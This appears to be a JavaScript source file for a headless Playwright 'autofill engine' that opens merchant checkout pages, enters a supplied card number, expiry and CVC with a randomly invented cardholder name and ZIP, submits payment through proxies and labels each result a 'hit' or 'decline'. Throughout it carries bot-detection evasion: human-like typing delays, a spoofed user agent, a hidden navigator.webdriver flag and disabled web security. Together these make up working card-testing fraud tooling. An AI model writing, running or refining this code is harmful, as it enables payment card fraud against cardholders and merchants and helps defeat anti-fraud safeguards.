// ⚡ ALPHA Worker — Autofill Engine (Playwright port of extension's autofill.js)
// Handles: generic forms, Stripe Elements (direct + iframe), Shopify, WooCommerce

import { chromium }           from 'playwright';
import { detectCheckoutType } from './checkout-detector.js';
import { toPlaywrightProxy }  from './proxy-manager.js';

// ── Field selector lists (ported from extension's autofill.js) ────────────────

const CARD_NUMBER_SELECTORS = [
  '[data-elements-stable-field-name="cardNumber"] input',
  '[data-elements-stable-field-name="cardNumber"]',
  'input[data-testid="cardNumber"]',
  '#cardNumber', '#card-number', '#cc-number', '#credit_card_number',
  '[name="cardNumber"]', '[name="card_number"]', '[name="cc-number"]', '[name="cardnumber"]', '[name="number"]',
  'input[autocomplete="cc-number"]',
  'input[id*="card_number" i]', 'input[id*="cardNumber" i]', 'input[id*="card-number" i]',
  'input[class*="card_number" i]', 'input[class*="cardNumber" i]',
  'input[placeholder*="card number" i]', 'input[placeholder*="Card Number" i]',
  'input[placeholder*="1234 5678"]', 'input[placeholder*="•••• ••••"]',
];

const EXPIRY_SELECTORS = [
  '[data-elements-stable-field-name="cardExpiry"] input',
  '[data-elements-stable-field-name="cardExpiry"]',
  'input[data-testid="cardExpiry"]',
  '#cardExpiry', '#card-expiry', '#cc-exp', '#expiry', '#expiration',
  '[name="cardExpiry"]', '[name="exp-date"]', '[name="expiry"]',
  '[name="cc-exp"]', '[name="card_expiry"]', '[name="expiration"]',
  'input[autocomplete="cc-exp"]',
  'input[id*="expir" i]', 'input[id*="exp-" i]',
  'input[placeholder*="MM/YY" i]', 'input[placeholder*="MM / YY" i]',
  'input[placeholder*="MM/YYYY" i]',
];

const CVC_SELECTORS = [
  '[data-elements-stable-field-name="cardCvc"] input',
  '[data-elements-stable-field-name="cardCvc"]',
  'input[data-testid="cardCvc"]',
  '#cardCvc', '#card-cvc', '#cc-cvc', '#cc-cvv', '#cvv', '#cvc',
  '[name="cardCvc"]', '[name="cvc"]', '[name="cvv"]',
  '[name="cc-csc"]', '[name="cc-cvc"]', '[name="security_code"]',
  'input[autocomplete="cc-csc"]',
  'input[id*="cvc" i]', 'input[id*="cvv" i]', 'input[id*="csc" i]',
  'input[placeholder*="CVC" i]', 'input[placeholder*="CVV" i]',
  'input[placeholder*="security code" i]', 'input[placeholder*="3-digit" i]',
];

const NAME_SELECTORS = [
  '[data-elements-stable-field-name="cardholderName"] input',
  '[data-elements-stable-field-name="cardholderName"]',
  'input[name="cardholderName"]', 'input[name="cardholder_name"]',
  'input[name="fullName"]', 'input[name="fullname"]', 'input[name="name"]',
  '#cardholderName', '#fullname', '#name-on-card', '#cc-name',
  'input[autocomplete="cc-name"]',
  'input[placeholder*="Full name" i]', 'input[placeholder*="Name on card" i]',
  'input[placeholder*="Cardholder" i]',
];

const ZIP_SELECTORS = [
  '[data-elements-stable-field-name="postalCode"] input',
  '[data-elements-stable-field-name="postalCode"]',
  'input[name="postalCode"]', 'input[name="postal_code"]',
  'input[name="billingPostalCode"]', 'input[name="billing_postcode"]',
  'input[name="zip"]', '#postalCode', '#postcode', '#zip', '#billing-zip',
  'input[autocomplete="postal-code"]',
  'input[placeholder*="ZIP" i]', 'input[placeholder*="Postal" i]',
  'input[placeholder*="Postcode" i]',
];

const SUBMIT_SELECTORS = [
  '[data-testid="hosted-payment-submit-button"]',
  'button[type="submit"]',
  'input[type="submit"]',
  'button:has-text("Pay now")',
  'button:has-text("Pay")',
  'button:has-text("Place Order")',
  'button:has-text("Complete Order")',
  'button:has-text("Complete Purchase")',
  'button:has-text("Confirm")',
  'button:has-text("Submit")',
  '#submitButton', '.submit-button', '#place_order',
  '[data-action="complete-order"]',
];

const SUCCESS_RE = /(\/success|\/confirmation|\/thank[-_]?you|\/complete|\/confirmed|\/receipt|\/order[-_]?complete|payment[-_]?success|order[-_]?confirmed)/i;
const DECLINE_RE = /\b(declin|card.{0,20}declin|payment.{0,20}fail|insufficient.{0,20}fund|invalid.{0,20}card|not.{0,20}authoriz|try.{0,20}another|card.{0,20}error)\b/i;

// ── Natural typing (avoids bot detection) ─────────────────────────────────────
async function typeNatural(page, value, delayMs = 45) {
  for (const ch of String(value)) {
    await page.keyboard.type(ch);
    await page.waitForTimeout(delayMs + Math.random() * 35);
  }
}

// ── Random name / ZIP generators ─────────────────────────────────────────────
const FIRST_NAMES = ['James','Mary','John','Patricia','Robert','Jennifer','Michael','Linda','David','Elizabeth','William','Susan','Richard','Jessica','Charles','Sarah'];
const LAST_NAMES  = ['Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis','Rodriguez','Martinez','Hernandez','Lopez','Gonzalez','Wilson','Anderson','Taylor'];

function randomName() {
  return FIRST_NAMES[Math.floor(Math.random() * FIRST_NAMES.length)] + ' ' +
         LAST_NAMES[Math.floor(Math.random() * LAST_NAMES.length)];
}

function randomZip() {
  return String(10000 + Math.floor(Math.random() * 90000));
}

// ── Find first visible element from a selector list ───────────────────────────
async function findVisible(page, selectors) {
  for (const sel of selectors) {
    try {
      const el = await page.$(sel);
      if (el && await el.isVisible()) return { el, sel };
    } catch {}
  }
  return null;
}

// ── Fill a field: click → clear → type naturally ──────────────────────────────
async function fillField(page, selectors, value) {
  const found = await findVisible(page, selectors);
  if (!found) return false;
  const { el } = found;
  await el.scrollIntoViewIfNeeded();
  await el.click();
  await page.waitForTimeout(150 + Math.random() * 100);
  // Clear existing value
  await el.fill('');
  await typeNatural(page, value);
  return true;
}

// ── Stripe iframe filler ───────────────────────────────────────────────────────
// Stripe renders card fields in separate iframes; we must enter each one.
async function fillStripeIframes(page, card) {
  const frames = page.frames();
  let filled   = { number: false, expiry: false, cvc: false };

  for (const frame of frames) {
    const url = frame.url();
    if (!url.includes('stripe.com') && !url.includes('js.stripe.com')) continue;

    try {
      const input = await frame.$('input[name], input[autocomplete], input');
      if (!input) continue;

      const name = await input.getAttribute('name') || await input.getAttribute('autocomplete') || '';

      // Identify which field this iframe holds
      if (!filled.number && (url.includes('cardnumber') || url.includes('card-number') || name.includes('cardnumber'))) {
        await input.click();
        await frame.waitForTimeout(200);
        await input.fill('');
        for (const ch of card.number) {
          await frame.keyboard.type(ch);
          await frame.waitForTimeout(40 + Math.random() * 30);
        }
        filled.number = true;

      } else if (!filled.expiry && (url.includes('cardexpiry') || url.includes('card-expiry') || name.includes('exp'))) {
        await input.click();
        await frame.waitForTimeout(200);
        await input.fill('');
        // Stripe wants MM/YY without the slash for keyboard events
        for (const ch of card.expiry) {
          await frame.keyboard.type(ch);
          await frame.waitForTimeout(40 + Math.random() * 30);
        }
        filled.expiry = true;

      } else if (!filled.cvc && (url.includes('cardcvc') || url.includes('card-cvc') || name.includes('cvc') || name.includes('cvv'))) {
        await input.click();
        await frame.waitForTimeout(200);
        await input.fill('');
        for (const ch of card.cvc) {
          await frame.keyboard.type(ch);
          await frame.waitForTimeout(40 + Math.random() * 30);
        }
        filled.cvc = true;
      }
    } catch {}

    if (filled.number && filled.expiry && filled.cvc) break;
  }

  return filled.number || filled.expiry || filled.cvc;
}

// ── Stripe hosted checkout (checkout.stripe.com) ───────────────────────────────
async function fillStripeHosted(page, card) {
  // Stripe hosted uses its own React form — fields are in the main frame
  // but rendered as Stripe Elements with known field names
  let ok = false;
  ok = await fillField(page, CARD_NUMBER_SELECTORS, card.number) || ok;
  await page.waitForTimeout(300);
  ok = await fillField(page, EXPIRY_SELECTORS, card.expiry)      || ok;
  await page.waitForTimeout(300);
  ok = await fillField(page, CVC_SELECTORS, card.cvc)            || ok;

  // Cardholder name + ZIP (required before most Stripe Checkout forms validate)
  await page.waitForTimeout(250);
  ok = await fillField(page, NAME_SELECTORS, randomName())       || ok;
  await page.waitForTimeout(250);
  ok = await fillField(page, ZIP_SELECTORS, randomZip())         || ok;

  // If direct fill failed, try iframes (some Stripe hosted pages use them)
  if (!ok) {
    ok = await fillStripeIframes(page, card);
  }
  return ok;
}

// ── Generic / WooCommerce checkout ────────────────────────────────────────────
async function fillGeneric(page, card) {
  let ok = false;
  ok = await fillField(page, CARD_NUMBER_SELECTORS, card.number) || ok;
  await page.waitForTimeout(400);
  ok = await fillField(page, EXPIRY_SELECTORS, card.expiry)      || ok;
  await page.waitForTimeout(300);
  ok = await fillField(page, CVC_SELECTORS, card.cvc)            || ok;

  // Cardholder name + ZIP
  await page.waitForTimeout(250);
  ok = await fillField(page, NAME_SELECTORS, randomName())       || ok;
  await page.waitForTimeout(250);
  ok = await fillField(page, ZIP_SELECTORS, randomZip())         || ok;

  // Fallback — try Stripe iframes embedded in the merchant page
  if (!ok) {
    ok = await fillStripeIframes(page, card);
  }
  return ok;
}

// ── Result detector ───────────────────────────────────────────────────────────
async function detectResult(page) {
  const url = page.url();
  if (SUCCESS_RE.test(url)) return { status: 'hit', message: 'Success page URL detected' };

  // Check visible page text
  try {
    const bodyText = await page.evaluate(() => document.body?.innerText || '');
    if (DECLINE_RE.test(bodyText))    return { status: 'decline', message: bodyText.match(DECLINE_RE)?.[0] || 'Declined' };
    if (SUCCESS_RE.test(bodyText))    return { status: 'hit',     message: 'Success text detected on page' };

    // Stripe-specific: look for "Your payment was declined" or "succeeded"
    if (/payment.{0,30}succeed/i.test(bodyText)) return { status: 'hit',     message: 'Payment succeeded' };
    if (/card.{0,30}declin/i.test(bodyText))     return { status: 'decline', message: 'Card was declined' };
  } catch {}

  return { status: 'unknown', message: 'Could not determine result' };
}

// ── Main entry point ─────────────────────────────────────────────────────────
export async function processCheckout({ url, card, proxy }) {
  const launchArgs = [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-blink-features=AutomationControlled',
    '--disable-web-security',
    '--disable-features=IsolateOrigins,site-per-process',
    '--window-size=1280,800',
  ];

  const playwrightProxy = proxy ? toPlaywrightProxy(proxy) : undefined;

  const browser = await chromium.launch({
    headless : true,
    args     : launchArgs,
    proxy    : playwrightProxy,
  });

  const context = await browser.newContext({
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    viewport : { width: 1280, height: 800 },
    locale   : 'en-US',
    timezoneId: 'America/New_York',
    // Disable WebDriver detection
    extraHTTPHeaders: {
      'Accept-Language': 'en-US,en;q=0.9',
    },
  });

  // Override navigator.webdriver
  await context.addInitScript(() => {
    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
    Object.defineProperty(navigator, 'plugins',   { get: () => [1, 2, 3, 4, 5] });
    Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
  });

  const page = await context.newPage();

  try {
    console.log(`[Autofill] Opening ${url}`);
    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 });
    await page.waitForTimeout(2000 + Math.random() * 1000);

    const type = await detectCheckoutType(page);
    console.log(`[Autofill] Checkout type: ${type}`);

    let filled = false;

    switch (type) {
      case 'stripe-hosted':
      case 'stripe-elements-direct':
        filled = await fillStripeHosted(page, card);
        break;

      case 'stripe-elements-iframe':
        filled = await fillStripeIframes(page, card);
        break;

      default:
        filled = await fillGeneric(page, card);
    }

    console.log(`[Autofill] Fields filled: ${filled}`);
    await page.waitForTimeout(800);

    // Screenshot BEFORE submit
    const screenshotBefore = await page.screenshot({ type: 'jpeg', quality: 85, fullPage: false });

    // Click submit
    let submitted = false;
    for (const sel of SUBMIT_SELECTORS) {
      try {
        const btn = await page.$(sel);
        if (btn && await btn.isVisible()) {
          await btn.scrollIntoViewIfNeeded();
          await page.waitForTimeout(300);
          await btn.click();
          submitted = true;
          console.log(`[Autofill] Clicked submit: ${sel}`);
          break;
        }
      } catch {}
    }

    if (!submitted) {
      console.warn('[Autofill] No submit button found — returning pre-submit screenshot');
      return {
        status    : 'error',
        message   : 'Could not find submit button',
        screenshot: screenshotBefore,
        url       : page.url(),
      };
    }

    // Wait for page to settle after submit (up to 15 s)
    try {
      await page.waitForNavigation({ timeout: 8000, waitUntil: 'domcontentloaded' });
    } catch {}
    await page.waitForTimeout(3000);

    // Screenshot AFTER submit
    const screenshotAfter = await page.screenshot({ type: 'jpeg', quality: 85, fullPage: false });
    const result          = await detectResult(page);

    console.log(`[Autofill] Result: ${result.status} — ${result.message}`);

    return {
      ...result,
      screenshot: screenshotAfter,
      url       : page.url(),
    };

  } catch (err) {
    console.error('[Autofill] Error:', err.message);
    let screenshot = null;
    try { screenshot = await page.screenshot({ type: 'jpeg', quality: 80 }); } catch {}
    return { status: 'error', message: err.message, screenshot, url: page.url() };

  } finally {
    await browser.close();
  }
}
